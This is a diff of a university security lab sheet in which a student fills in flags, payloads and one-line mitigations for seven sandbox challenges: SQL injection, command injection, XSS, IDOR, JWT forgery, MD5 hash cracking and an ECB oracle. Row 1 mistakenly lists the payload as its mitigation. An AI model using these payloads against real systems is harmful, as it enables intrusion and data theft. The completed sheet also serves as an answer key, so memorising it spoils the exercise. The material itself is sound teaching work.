@@ -3,7 +3,7 @@
 **Course:** Software Security (KOSEN69) · **Covers:** Weeks 1–6
 **Time:** 150 min · **Total:** 100 pts · **Individual** · Sandbox targets only (ethics policy applies).
 
-**Name:** ____________________  **Student ID:** ____________
+**Name:** _______Sutapat Chucham_____________  **Student ID:** ______6531503085______
 
 > Each challenge yields a **flag** in the form `FLAG{...}` (or the proof noted). Submit, per challenge: the **flag**, the **payload/command** you used, and a **one-line mitigation**. Partial credit for documented progress without the flag.
 
@@ -32,13 +32,20 @@
 
 | # | Flag / proof | Payload or command | Mitigation (1 line) |
 |---|---|---|---|
-| 1 | | | |
-| 2 | | | |
-| 3 | | | |
-| 4 | | | |
-| 5 | | | |
-| 6 | | | |
-| 7 | | | |
+| 1 | FLAG{sqli_demo} | q=%' UNION SELECT username, password FROM users--| q = %' UNION SELECT username, password FROM users-- |
+| 2 | FLAG{cmdi_demo} | host=127.0.0.1; cat /flag.txt | Drop the shell — use subprocess.run([...], shell=False) and allow-list host. |
+| 3 |![screenshot: 3-6531503085.png](<img/3-6531503085 .png>)  | body=<img src=x onerror=alert(document.domain)>
+         POST to http://localhost:8080/comments | Auto-escape on output ({{ value }} in Jinja2 / textContent, never 
+            |safe or innerHTML) plus a strict CSP as backup.
+|
+| 4 |  FLAG{idor_demo} | Login as alice, GET /api/orders/2 (bob's order, not alice's)
+ | Check ownership on every object access — if order.owner != current_user(): abort(403).
+|
+| 5 | FLAG{jwt_demo} | jwt.encode({'sub':'admin'}, 'secret', algorithm='HS256')
+ | Use a long random secret from env (not hardcoded "secret"), 
+            and don't accept alg=none — pin algorithms=["HS256"] only. |
+| 6 | ![screenshot: 6-6531503085.png](<img/6-6531503085.png>)|hashcat -m 0 hashes.txt rockyou.txt (or john --format=raw-md5) | Store passwords with a slow salted KDF (argon2id / bcrypt), never a fast unsalted hash like MD5.|
+| 7 | ![screenshot: 7-6531503085.png](<img/7-6531503085.png>) |repeated-block ciphertext comparison / byte-at-a-time decryption on the oracle | Use an authenticated mode with a random nonce (AES-GCM), never ECB — identical plaintext blocks must not map to identical ciphertext. |
 
 ---
 
